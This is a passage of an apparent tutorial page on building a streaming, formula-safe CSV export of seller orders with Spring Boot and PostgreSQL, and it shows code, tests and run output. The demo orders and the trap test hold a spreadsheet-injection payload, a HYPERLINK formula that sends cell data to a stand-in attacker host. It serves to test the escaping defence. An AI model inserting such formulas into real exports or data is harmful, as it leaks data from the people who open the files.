file</td><td><code>aSellerExportsOnlyTheirOwnOrdersWhateverTheyAddToTheRequest</code></td></tr><tr><td>SQL and paths in the dates</td><td><code>400</code></td><td><code>maliciousDatesAreRefused</code></td></tr><tr><td>Rules written by plain SQL</td><td>Refused by named constraints</td><td><code>orderAndExportRulesHoldWithoutJava</code></td></tr><tr><td>The log cannot be written</td><td>No export</td><td><code>anExportThatCannotBeLoggedDoesNotStart</code></td></tr></tbody></table></div>
+<h2>The trap</h2>
+<div class="trap">
+<p class="eyebrow">Plausible but wrong</p>
+<p class="lead">Building the whole file in memory, and not escaping cells that start with '='.</p>
+<ul>
+<li><strong>The old way.</strong> The test reads every order into a list and joins the cells with commas into one String. The file has a line starting <code>KW-1003,=HYPERLINK(</code>, a formula, and "Cotton kurta, blue" splits into two cells.</li>
+<li><strong>The API.</strong> The same orders: the formula starts with <code>'</code> and is quoted, and the kurta's name is one cell.</li>
+<li><strong>Memory.</strong> <code>StreamingExportTest</code> exports a million orders on a real port: the first lines arrive about as fast as an empty export, long before every row could have been read.</li>
+</ul>
+<p>While building, each part was undone once: no fetch size turned 1 test red; no transaction 1; no formula guard 3; no quoting 2; no byte order mark 3; UTC days 4; any seller's orders 3; no range check 1; no export log 2.</p>
+</div>
+<pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+
+import java.math.BigDecimal;
+import java.util.List;
+
+import static org.assertj.core.api.Assertions.assertThat;
+
+/**
+ * Written first. The old export loaded every order into a list and joined the cells with commas into one String.
+ * A year of orders ran the server out of memory, and a product named =HYPERLINK(...) became a working link the
+ * moment the seller opened the file. These tests run the old way and the API on the same orders.
+ */
+class FormulaAndMemoryTrapTest extends ApiTest {
+
+    record Row(String ref, String product, int quantity, long paise, String city) {
+    }
+
+    @Test
+    void theOldWayHeldEverythingAndPassedTheFormulaOn() {
+        List&lt;Row&gt; all = jdbc.sql(&quot;SELECT order_ref AS ref, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city FROM orders WHERE seller_id = 1 ORDER BY placed_at&quot;)
+                .query(Row.class).list();   // every row at once
+        String csv = String.join(&quot;\n&quot;, all.stream().map(r -&gt; String.join(&quot;,&quot;, r.ref(), r.product(), &quot;&quot; + r.quantity(),
+                BigDecimal.valueOf(r.paise(), 2).toPlainString(), r.city())).toList());   // the whole file at once
+        assertThat(csv.lines()).anyMatch(l -&gt; l.startsWith(&quot;KW-1003,=HYPERLINK(&quot;));   // a formula cell
+        assertThat(csv.lines().filter(l -&gt; l.startsWith(&quot;KW-1001&quot;)).findFirst().orElseThrow().split(&quot;,&quot;)).hasSize(6);   // &quot;kurta, blue&quot; split in two
+    }
+
+    @Test
+    void theApiNeutralisesFormulasAndQuotesCells() throws Exception {
+        List&lt;String&gt; lines = lines(export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;));
+        assertThat(lines).contains(
+                &quot;KW-1001,2026-01-05 10:15,\&quot;Cotton kurta, blue\&quot;,2,1299.00,Pune,DELIVERED&quot;,
+                &quot;KW-1003,2026-06-30 18:29,\&quot;&#x27;=HYPERLINK(\&quot;\&quot;http://evil.example/?d=\&quot;\&quot;&amp;A1,\&quot;\&quot;Click for refund\&quot;\&quot;)\&quot;,1,99.00,Delhi,PLACED&quot;,
+                &quot;KW-1004,2026-07-01 09:00,&#x27;+91 Special offer,3,597.00,&#x27;@Mumbai,CANCELLED&quot;);
+    }
+}</code></pre></section><section role="tabpanel" id="panel-code" aria-labelledby="tab-code" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>Set up and run: commands for Windows and macOS/Linux, troubleshooting</li><li>Try it yourself</li><li>10. Complete working code, in the order a request travels</li><li>11. Code explanation</li></ul><p class="rule">Level 2. Every command here was run and gave the results shown.</p></aside>
+<h2>Set up and run</h2>
+<div class="scroll"><table class=""><thead><tr><th>You need</th><th>Version</th><th>Check with</th></tr></thead><tbody><tr><td>JDK</td><td>25 (recommended). JDK 21 also works, see below</td><td><code>java -version</code></td></tr><tr><td>Docker</td><td>Docker Desktop (Windows, macOS) or Docker Engine (Linux), running</td><td><code>docker info</code></td></tr><tr><td>Maven</td><td>Not needed: the project ships the Maven wrapper</td><td></td></tr></tbody></table></div>
+<p><strong>macOS / Linux</strong></p>
+<pre class="code"><code class="language-bash">docker compose up -d        # PostgreSQL 17 on localhost:5432
+./mvnw spring-boot:run      # the API on http://localhost:8080
+./mvnw test                 # all 12 tests; starts its own PostgreSQL container</code></pre>
+<p><strong>Windows (PowerShell)</strong></p>
+<pre class="code"><code class="language-powershell">docker compose up -d
+.\mvnw.cmd spring-boot:run
+.\mvnw.cmd test</code></pre>
+<p class="muted">On JDK 21, add <code>-Djava.version=21</code>. Nothing here needs a Java 25 feature. The full test run takes longer than most stations: one test exports a million orders.</p>
+<h2>Try it yourself</h2>
+<p>Download Neha's 2026 orders and open the file in a spreadsheet:</p>
+<pre class="code"><code class="language-bash">curl -u neha.store:neha-demo-pass -o orders.csv &#x27;http://localhost:8080/seller/orders/export?from=2026-01-01&amp;to=2026-12-31&#x27;</code></pre>
+<p>The file is case 1. Product KW-1003 shows as text starting <code>'=HYPERLINK</code>, not as a link, and the Hindi name reads correctly.</p>
+<h2>Troubleshooting</h2>
+<div class="scroll"><table class=""><thead><tr><th>You see</th><th>Cause</th><th>Fix</th></tr></thead><tbody><tr><td>Memory grows with the export's size</td><td>Rows read all at once: no fetch size, or no transaction (PostgreSQL's driver then reads everything).</td><td>Set <code>spring.jdbc.template.fetch-size</code> and read inside a transaction.</td></tr><tr><td>The first row takes seconds even when streaming</td><td>The database sorts every row before the first: the plan does not follow an index, often because statistics are missing.</td><td><code>ANALYZE</code> (autovacuum does it in time); check with <code>EXPLAIN</code>.</td></tr><tr><td>Excel shows garbled Hindi</td><td>No byte order mark: Excel guesses another encoding.</td><td>Write <code>EF BB BF</code> first.</td></tr><tr><td><code>Could not find a valid Docker environment</code></td><td>Docker is not running.</td><td>Start Docker Desktop or the Docker service.</td></tr></tbody></table></div>
+<h2>Project layout</h2>
+<pre class="tree">stations/093-order-export-to-csv/
+├── pom.xml, mvnw, mvnw.cmd, .mvn/, compose.yaml
+├── src/main/java/com/kartwala/export/
+│   ├── SecurityConfig.java   ├── ExportController.java   ├── OrderExport.java   ├── Csv.java
+│   └── ProblemResponses.java   └── ExportApplication.java
+├── src/main/resources/
+│   ├── application.yaml
+│   └── db/migration/   V1__orders_and_export_log.sql, V2__demo_orders.sql
+├── src/test/java/com/kartwala/export/   (see Tests)
+├── challenge/                Practice tests; solutions ship separately
+├── review/                   The flawed version (see Review)
+└── docs/                     capture script, captures, saved runs</pre>
+<h2>Code walkthrough</h2>
+<p class="muted">In the order a request travels, then the database behind it.</p>
+<div class="files"><div class="file-list" role="tablist" aria-label="Files"><button class="file-btn" role="tab" id="code-0-b" aria-controls="code-0" aria-selected="true" data-group="code">SecurityConfig.java</button><button class="file-btn" role="tab" id="code-1-b" aria-controls="code-1" aria-selected="false" data-group="code">ExportController.java</button><button class="file-btn" role="tab" id="code-2-b" aria-controls="code-2" aria-selected="false" data-group="code">OrderExport.java</button><button class="file-btn" role="tab" id="code-3-b" aria-controls="code-3" aria-selected="false" data-group="code">Csv.java</button><button class="file-btn" role="tab" id="code-4-b" aria-controls="code-4" aria-selected="false" data-group="code">ProblemResponses.java</button><button class="file-btn" role="tab" id="code-5-b" aria-controls="code-5" aria-selected="false" data-group="code">V1__orders_and_export_log.sql</button><button class="file-btn" role="tab" id="code-6-b" aria-controls="code-6" aria-selected="false" data-group="code">V2__demo_orders.sql</button><button class="file-btn" role="tab" id="code-7-b" aria-controls="code-7" aria-selected="false" data-group="code">application.yaml</button><button class="file-btn" role="tab" id="code-8-b" aria-controls="code-8" aria-selected="false" data-group="code">compose.yaml</button><button class="file-btn" role="tab" id="code-9-b" aria-controls="code-9" aria-selected="false" data-group="code">ExportApplication.java</button></div><div class="file-body"><div class="file-pane" role="tabpanel" id="code-0" aria-labelledby="code-0-b"><p class="path">src/main/java/com/kartwala/export/SecurityConfig.java</p><div class="notes"><dl class="dwn"><dt>Does</dt><dd>Who may export.</dd><dt>Why</dt><dd>HTTP Basic; sellers only; everything else refused.</dd><dt>Without it</dt><dd>Support or anyone downloading buyers' data.</dd></dl></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.http.HttpMethod;
+import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.http.SessionCreationPolicy;
+import org.springframework.security.core.userdetails.User;
+import org.springframework.security.crypto.factory.PasswordEncoderFactories;
+import org.springframework.security.crypto.password.PasswordEncoder;
+import org.springframework.security.provisioning.InMemoryUserDetailsManager;
+import org.springframework.security.web.SecurityFilterChain;
+
+@Configuration
+class SecurityConfig {
+
+    @Bean
+    SecurityFilterChain api(HttpSecurity http, ProblemResponses problems) throws Exception {
+        http.authorizeHttpRequests(a -&gt; a
+                        .requestMatchers(HttpMethod.GET, &quot;/seller/orders/export&quot;).hasRole(&quot;SELLER&quot;)
+                        .requestMatchers(&quot;/error&quot;).permitAll()
+                        .anyRequest().denyAll())
+                .httpBasic(b -&gt; b.authenticationEntryPoint(problems::unauthenticated))
+                .exceptionHandling(x -&gt; x.authenticationEntryPoint(problems::unauthenticated).accessDeniedHandler(problems::forbidden))
+                .sessionManagement(s -&gt; s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
+                .csrf(csrf -&gt; csrf.disable());   // credentials in a header with every request, no cookie a browser sends by itself
+        return http.build();
+    }
+
+    @Bean
+    PasswordEncoder passwordEncoder() {
+        return PasswordEncoderFactories.createDelegatingPasswordEncoder();
+    }
+
+    /** Demo users, password &quot;name-demo-pass&quot; (name before the dot). Support may not export buyers&#x27; data. */
+    @Bean
+    InMemoryUserDetailsManager users(PasswordEncoder encoder) {
+        return new InMemoryUserDetailsManager(
+                User.withUsername(&quot;neha.store&quot;).password(encoder.encode(&quot;neha-demo-pass&quot;)).roles(&quot;SELLER&quot;).build(),
+                User.withUsername(&quot;arun.mart&quot;).password(encoder.encode(&quot;arun-demo-pass&quot;)).roles(&quot;SELLER&quot;).build(),
+                User.withUsername(&quot;sam.help&quot;).password(encoder.encode(&quot;sam-demo-pass&quot;)).roles(&quot;SUPPORT&quot;).build());
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-1" aria-labelledby="code-1-b" hidden><p class="path">src/main/java/com/kartwala/export/ExportController.java</p><div class="notes"><dl class="dwn"><dt>Does</dt><dd>The endpoint.</dd><dt>Why</dt><dd>Checks the range, takes the seller from the sign-in, records the export, and returns a <code>StreamingResponseBody</code> with a CSV type, a charset and a file name.</dd><dt>Without it</dt><dd>A request that names another seller's id.</dd></dl></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.format.annotation.DateTimeFormat;
+import org.springframework.http.ContentDisposition;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.MediaType;
+import org.springframework.http.ProblemDetail;
+import org.springframework.http.ResponseEntity;
+import org.springframework.security.core.Authentication;
+import org.springframework.web.ErrorResponseException;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;
+
+import java.time.LocalDate;
+import java.time.temporal.ChronoUnit;
+import java.util.Map;
+
+@RestController
+class ExportController {
+
+    /** Demo rule: at most 366 days, both ends included. */
+    static final int MAX_DAYS = 366;
+
+    /** Demo sellers: sign-in name to seller id. The seller always comes from the sign-in, never from the request. */
+    static final Map&lt;String, Long&gt; SELLERS = Map.of(&quot;neha.store&quot;, 1L, &quot;arun.mart&quot;, 2L);
+
+    private final OrderExport export;
+
+    ExportController(OrderExport export) {
+        this.export = export;
+    }
+
+    /** The CSV is written while it is read from the database, so a year of orders never sits in memory. */
+    @GetMapping(&quot;/seller/orders/export&quot;)
+    ResponseEntity&lt;StreamingResponseBody&gt; export(@RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate from,
+                                                 @RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate to, Authentication who) {
+        if (to.isBefore(from) || ChronoUnit.DAYS.between(from, to) &gt;= MAX_DAYS) {
+            throw new ErrorResponseException(HttpStatus.BAD_REQUEST,
+                    ProblemDetail.forStatusAndDetail(HttpStatus.BAD_REQUEST, &quot;from must be on or before to, and at most a year apart&quot;), null);
+        }
+        long seller = SELLERS.get(who.getName());
+        export.log(seller, from, to);
+        StreamingResponseBody body = out -&gt; export.write(seller, from, to, out);
+        return ResponseEntity.ok()
+                .contentType(new MediaType(&quot;text&quot;, &quot;csv&quot;, java.nio.charset.StandardCharsets.UTF_8))
+                .header(HttpHeaders.CONTENT_DISPOSITION, ContentDisposition.attachment().filename(&quot;orders-&quot; + from + &quot;-to-&quot; + to + &quot;.csv&quot;).build().toString())
+                .body(body);
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-2" aria-labelledby="code-2-b" hidden><p class="path">src/main/java/com/kartwala/export/OrderExport.java</p><div class="notes"><dl class="dwn"><dt>Does</dt><dd>Reading and writing, row by row.</dd><dt>Why</dt><dd>A read-only transaction, so the PostgreSQL driver uses a cursor with the fetch size; each row goes straight to the writer.</dd><dt>Without it</dt><dd>A year of orders in memory.</dd></dl><ul><li>The PostgreSQL driver uses a cursor only inside a transaction and with a fetch size. Without either, it reads every row before handing over the first: about 2 s instead of about 50 ms for a million rows here. Found while building.</li><li>A byte order mark first, so Excel reads UTF-8.</li><li>If the client goes away, the write fails and reading stops.</li></ul></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.jdbc.core.simple.JdbcClient;
+import org.springframework.stereotype.Service;
+import org.springframework.transaction.PlatformTransactionManager;
+import org.springframework.transaction.support.TransactionTemplate;
+
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.UncheckedIOException;
+import java.math.BigDecimal;
+import java.nio.charset.StandardCharsets;
+import java.time.LocalDate;
+import java.time.OffsetDateTime;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+
+@Service
+class OrderExport {
+
+    static final ZoneId IST = ZoneId.of(&quot;Asia/Kolkata&quot;);
+    static final String HEADER = &quot;order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status&quot;;
+    private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm&quot;);
+
+    private final JdbcClient jdbc;
+    private final TransactionTemplate readOnly;
+
+    OrderExport(JdbcClient jdbc, PlatformTransactionManager transactions) {
+        this.jdbc = jdbc;
+        this.readOnly = new TransactionTemplate(transactions);
+        this.readOnly.setReadOnly(true);
+    }
+
+    /** Recorded before the first byte is sent; the database refuses a range of more than a year from any writer. */
+    void log(long sellerId, LocalDate from, LocalDate to) {
+        jdbc.sql(&quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (?, ?, ?)&quot;).params(sellerId, from, to).update();
+    }
+
+    /**
+     * Writes the seller&#x27;s orders, oldest first, as rows arrive from the database: PostgreSQL hands them over 1,000 at a
+     * time through a cursor (fetch size, in a transaction), and each row is written and forgotten. Memory stays the
+     * same for ten orders or a year of them. The days are IST days.
+     */
+    void write(long sellerId, LocalDate from, LocalDate to, OutputStream out) throws IOException {
+        BufferedWriter w = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
+        w.write(&#x27;\uFEFF&#x27;);   // a byte order mark, so Excel reads the file as UTF-8 (Hindi product names)
+        w.write(HEADER);
+        w.write(&quot;\r\n&quot;);
+        try {
+            readOnly.executeWithoutResult(s -&gt; jdbc.sql(&quot;&quot;&quot;
+                            SELECT order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status FROM orders
+                            WHERE seller_id = ? AND placed_at &gt;= ? AND placed_at &lt; ? ORDER BY placed_at, id&quot;&quot;&quot;)
+                    .params(sellerId, start(from), start(to.plusDays(1)))
+                    .query(rs -&gt; {
+                        try {
+                            w.write(Csv.text(rs.getString(1)) + &quot;,&quot; + rs.getObject(2, OffsetDateTime.class).atZoneSameInstant(IST).format(TIME) + &quot;,&quot;
+                                    + Csv.text(rs.getString(3)) + &quot;,&quot; + rs.getInt(4) + &quot;,&quot; + BigDecimal.valueOf(rs.getLong(5), 2).toPlainString() + &quot;,&quot;
+                                    + Csv.text(rs.getString(6)) + &quot;,&quot; + rs.getString(7) + &quot;\r\n&quot;);
+                        } catch (IOException e) {
+                            throw new UncheckedIOException(e);   // the client went away: stop reading
+                        }
+                    }));
+        } catch (UncheckedIOException e) {
+            throw e.getCause();
+        }
+        w.flush();
+    }
+
+    private static OffsetDateTime start(LocalDate istDay) {
+        return istDay.atStartOfDay(IST).toOffsetDateTime();
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-3" aria-labelledby="code-3-b" hidden><p class="path">src/main/java/com/kartwala/export/Csv.java</p><div class="notes"><dl class="dwn"><dt>Does</dt><dd>One cell, safe for CSV and for spreadsheets.</dd><dt>Why</dt><dd>A leading <code>'</code> for = + - @ tab CR, then RFC 4180 quoting.</dd><dt>Without it</dt><dd>Formulas run on the seller's computer; cells split at commas.</dd></dl></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+/** One CSV cell, safe for spreadsheets. */
+final class Csv {
+
+    private Csv() {
+    }
+
+    /**
+     * Text that starts with = + - @ (or a tab or carriage return) is a formula to Excel, Sheets and LibreOffice:
+     * a product named =HYPERLINK(...) would run when the seller opens the file. Such text gets a leading &#x27; so it
+     * stays text (the OWASP advice for CSV injection). Then RFC 4180 quoting: a cell with a comma, quote or line
+     * break is quoted, and quotes inside are doubled.
+     */
+    static String text(String value) {
+        String v = value;
+        if (!v.isEmpty() &amp;&amp; &quot;=+-@\t\r&quot;.indexOf(v.charAt(0)) &gt;= 0) {
+            v = &quot;&#x27;&quot; + v;
+        }
+        if (v.contains(&quot;,&quot;) || v.contains(&quot;\&quot;&quot;) || v.contains(&quot;\n&quot;) || v.contains(&quot;\r&quot;)) {
+            v = &quot;\&quot;&quot; + v.replace(&quot;\&quot;&quot;, &quot;\&quot;\&quot;&quot;) + &quot;\&quot;&quot;;
+        }
+        return v;
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-4" aria-labelledby="code-4-b" hidden><p class="path">src/main/java/com/kartwala/export/ProblemResponses.java</p><div class="notes"><p><code>401</code> and <code>403</code> in the same problem shape as other errors.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import org.springframework.http.HttpStatus;
+import org.springframework.security.access.AccessDeniedException;
+import org.springframework.security.core.AuthenticationException;
+import org.springframework.stereotype.Component;
+import tools.jackson.databind.json.JsonMapper;
+
+import java.io.IOException;
+import java.util.LinkedHashMap;
+import java.util.Map;
+
+/** 401 and 403 are decided in Spring Security&#x27;s filters, before any controller: written here in the same problem shape. */
+@Component
+class ProblemResponses {
+
+    private static final JsonMapper JSON = JsonMapper.builder().build();
+
+    void unauthenticated(HttpServletRequest req, HttpServletResponse res, AuthenticationException e) throws IOException {
+        // The same answer for an unknown username and a wrong password: nothing tells an attacker which accounts exist.
+        res.setHeader(&quot;WWW-Authenticate&quot;, &quot;Basic realm=\&quot;kartwala\&quot;&quot;);
+        write(req, res, HttpStatus.UNAUTHORIZED, &quot;Sign-in required&quot;, &quot;Send a valid username and password.&quot;);
+    }
+
+    void forbidden(HttpServletRequest req, HttpServletResponse res, AccessDeniedException e) throws IOException {
+        write(req, res, HttpStatus.FORBIDDEN, &quot;Not allowed&quot;, &quot;This sign-in cannot do this.&quot;);
+    }
+
+    private static void write(HttpServletRequest req, HttpServletResponse res, HttpStatus status, String title, String detail) throws IOException {
+        Map&lt;String, Object&gt; body = new LinkedHashMap&lt;&gt;();
+        body.put(&quot;title&quot;, title);
+        body.put(&quot;status&quot;, status.value());
+        body.put(&quot;detail&quot;, detail);
+        body.put(&quot;instance&quot;, req.getRequestURI());
+        res.setStatus(status.value());
+        res.setContentType(&quot;application/problem+json&quot;);
+        JSON.writeValue(res.getOutputStream(), body);
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-5" aria-labelledby="code-5-b" hidden><p class="path">src/main/resources/db/migration/V1__orders_and_export_log.sql</p><div class="notes"><dl class="dwn"><dt>Does</dt><dd>Orders and the export log.</dd><dt>Why</dt><dd>Named constraints; the range rule in the log; an index on seller and time.</dd><dt>Without it</dt><dd>Bad rows, or a log entry for an export the API would refuse.</dd></dl></div><div class="src"><pre class="code"><code class="language-sql">CREATE TABLE orders (
+    id           bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT orders_pk PRIMARY KEY,
+    seller_id    bigint NOT NULL,
+    order_ref    text NOT NULL,
+    placed_at    timestamptz NOT NULL,
+    product_name text NOT NULL,
+    quantity     integer NOT NULL,
+    amount_paise bigint NOT NULL,
+    buyer_city   text NOT NULL,
+    status       text NOT NULL,
+    CONSTRAINT orders_ref_once_per_seller UNIQUE (seller_id, order_ref),
+    CONSTRAINT orders_quantity_positive CHECK (quantity &gt; 0),
+    CONSTRAINT orders_amount_positive CHECK (amount_paise &gt; 0),
+    CONSTRAINT orders_status CHECK (status IN (&#x27;PLACED&#x27;, &#x27;SHIPPED&#x27;, &#x27;DELIVERED&#x27;, &#x27;CANCELLED&#x27;))
+);
+CREATE INDEX orders_seller_time ON orders (seller_id, placed_at);
+
+-- Every export of buyers&#x27; data is recorded before it starts: who, which days, when.
+CREATE TABLE export_log (
+    id          bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT export_log_pk PRIMARY KEY,
+    seller_id   bigint NOT NULL,
+    from_date   date NOT NULL,
+    to_date     date NOT NULL,
+    exported_at timestamptz NOT NULL DEFAULT now(),
+    -- Demo rule: at most a year per export, 366 days with both ends included.
+    CONSTRAINT export_log_range CHECK (to_date &gt;= from_date AND to_date - from_date &lt; 366)
+);</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-6" aria-labelledby="code-6-b" hidden><p class="path">src/main/resources/db/migration/V2__demo_orders.sql</p><div class="notes"><p>Six orders, some with names a real seller types and some an attacker would.</p></div><div class="src"><pre class="code"><code class="language-sql">-- Two sellers. Some product names are what sellers really type, and some are what an attacker would.
+INSERT INTO orders (seller_id, order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status) VALUES
+    (1, &#x27;KW-1001&#x27;, &#x27;2026-01-05 10:15+05:30&#x27;, &#x27;Cotton kurta, blue&#x27;, 2, 129900, &#x27;Pune&#x27;, &#x27;DELIVERED&#x27;),
+    (1, &#x27;KW-1002&#x27;, &#x27;2026-03-17 23:50+05:30&#x27;, &#x27;Mug &quot;Chai time&quot;&#x27;, 1, 34900, &#x27;Chennai&#x27;, &#x27;SHIPPED&#x27;),
+    (1, &#x27;KW-1003&#x27;, &#x27;2026-06-30 18:29+05:30&#x27;, &#x27;=HYPERLINK(&quot;http://evil.example/?d=&quot;&amp;A1,&quot;Click for refund&quot;)&#x27;, 1, 9900, &#x27;Delhi&#x27;, &#x27;PLACED&#x27;),
+    (1, &#x27;KW-1004&#x27;, &#x27;2026-07-01 09:00+05:30&#x27;, &#x27;+91 Special offer&#x27;, 3, 59700, &#x27;@Mumbai&#x27;, &#x27;CANCELLED&#x27;),
+    (1, &#x27;KW-1005&#x27;, &#x27;2026-12-31 23:59+05:30&#x27;, &#x27;साड़ी, सिल्क&#x27;, 1, 459900, &#x27;Varanasi&#x27;, &#x27;PLACED&#x27;),
+    (2, &#x27;AM-2001&#x27;, &#x27;2026-02-11 12:00+05:30&#x27;, &#x27;Steel bottle&#x27;, 1, 49900, &#x27;Kochi&#x27;, &#x27;DELIVERED&#x27;);</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-7" aria-labelledby="code-7-b" hidden><p class="path">src/main/resources/application.yaml</p><div class="notes"><p><code>spring.jdbc.template.fetch-size: 1000</code>.</p></div><div class="src"><pre class="code"><code class="language-yaml">spring:
+  application:
+    name: kartwala-export
+  mvc:
+    problemdetails:
+      enabled: true
+  datasource:
+    url: jdbc:postgresql://localhost:5432/kartwala
+    username: kartwala
+    password: kartwala
+  jdbc:
+    template:
+      # Rows come from PostgreSQL 1,000 at a time (a cursor, inside a transaction), not all at once.
+      fetch-size: 1000</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-8" aria-labelledby="code-8-b" hidden><p class="path">compose.yaml</p><div class="notes"><p>PostgreSQL 17 for running the app.</p></div><div class="src"><pre class="code"><code class="language-yaml">services:
+  postgres:
+    image: postgres:17-alpine
+    environment:
+      POSTGRES_DB: kartwala
+      POSTGRES_USER: kartwala
+      POSTGRES_PASSWORD: kartwala
+    ports:
+      - &quot;5432:5432&quot;
+    healthcheck:
+      test: [&quot;CMD-SHELL&quot;, &quot;pg_isready -U kartwala -d kartwala&quot;]
+      interval: 2s
+      timeout: 3s
+      retries: 20</code></pre></div></div><div class="file-pane" role="tabpanel" id="code-9" aria-labelledby="code-9-b" hidden><p class="path">src/main/java/com/kartwala/export/ExportApplication.java</p><div class="notes"><p>Entry point.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+
+@SpringBootApplication
+public class ExportApplication {
+
+    public static void main(String[] args) {
+        SpringApplication.run(ExportApplication.class, args);
+    }
+}</code></pre></div></div></div></div></section><section role="tabpanel" id="panel-tests" aria-labelledby="tab-tests" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>13. Testing: each required test named, with what it proves</li><li>Real run output</li></ul><p class="rule">The trap test was written first.</p></aside>
+<h2>Required tests for this station</h2>
+<div class="scroll"><table class=""><thead><tr><th>Required by</th><th>Requirement</th><th>Test class</th><th>Result</th></tr></thead><tbody><tr><td>Every station</td><td>HTTP contract: valid, invalid, not found</td><td><code>ExportContractTest</code> (4)</td><td><span class="pill ok">pass</span></td></tr><tr><td>Every station</td><td>Reproduce the failure before the fix</td><td><code>FormulaAndMemoryTrapTest</code> (2), <code>StreamingExportTest</code> (1)</td><td><span class="pill ok">pass</span></td></tr><tr><td>Database</td><td>Rollback and constraint tests against a real database</td><td><code>ExportDatabaseTest</code> (2)</td><td><span class="pill ok">pass</span></td></tr><tr><td>Security</td><td>401, 403, one user accessing another user's data, malicious input</td><td><code>ExportSecurityTest</code> (3)</td><td><span class="pill ok">pass</span></td></tr></tbody></table></div>
+<p class="muted">How to prove streaming took three tries. A check that PostgreSQL still had the query open could not tell streaming from loading everything (the transaction is open in both). Timing a million rows works: the first lines arrive about as fast as an empty export, while reading every row takes seconds, so loading them first could not be that fast. And at first even the streaming version was slow: on a fresh table without statistics, PostgreSQL sorted the whole year before the first row; after <code>ANALYZE</code> it reads the index in order. Found while building.</p>
+<h2>Run output</h2>
+<p class="muted">JDK 25.0.1, Spring Boot 4.1.1, PostgreSQL 17 in Testcontainers. Nothing skipped. Saved in <code>docs/test-run.txt</code>.</p>
+<pre class="console">[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.StreamingExportTest
+[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.FormulaAndMemoryTrapTest
+[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportSecurityTest
+[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportDatabaseTest
+[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportContractTest
+[INFO] Tests run: 12, Failures: 0, Errors: 0, Skipped: 0
+[INFO] BUILD SUCCESS</pre>
+<h2>Test files</h2>
+<div class="files"><div class="file-list" role="tablist" aria-label="Files"><button class="file-btn" role="tab" id="tests-0-b" aria-controls="tests-0" aria-selected="true" data-group="tests">FormulaAndMemoryTrapTest.java</button><button class="file-btn" role="tab" id="tests-1-b" aria-controls="tests-1" aria-selected="false" data-group="tests">StreamingExportTest.java</button><button class="file-btn" role="tab" id="tests-2-b" aria-controls="tests-2" aria-selected="false" data-group="tests">ExportContractTest.java</button><button class="file-btn" role="tab" id="tests-3-b" aria-controls="tests-3" aria-selected="false" data-group="tests">ExportSecurityTest.java</button><button class="file-btn" role="tab" id="tests-4-b" aria-controls="tests-4" aria-selected="false" data-group="tests">ExportDatabaseTest.java</button><button class="file-btn" role="tab" id="tests-5-b" aria-controls="tests-5" aria-selected="false" data-group="tests">ApiTest.java</button><button class="file-btn" role="tab" id="tests-6-b" aria-controls="tests-6" aria-selected="false" data-group="tests">PostgresTestConfig.java</button></div><div class="file-body"><div class="file-pane" role="tabpanel" id="tests-0" aria-labelledby="tests-0-b"><p class="path">src/test/java/com/kartwala/export/FormulaAndMemoryTrapTest.java</p><div class="notes"><p>Written first: the old list-and-join way against the API.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+
+import java.math.BigDecimal;
+import java.util.List;
+
+import static org.assertj.core.api.Assertions.assertThat;
+
+/**
+ * Written first. The old export loaded every order into a list and joined the cells with commas into one String.
+ * A year of orders ran the server out of memory, and a product named =HYPERLINK(...) became a working link the
+ * moment the seller opened the file. These tests run the old way and the API on the same orders.
+ */
+class FormulaAndMemoryTrapTest extends ApiTest {
+
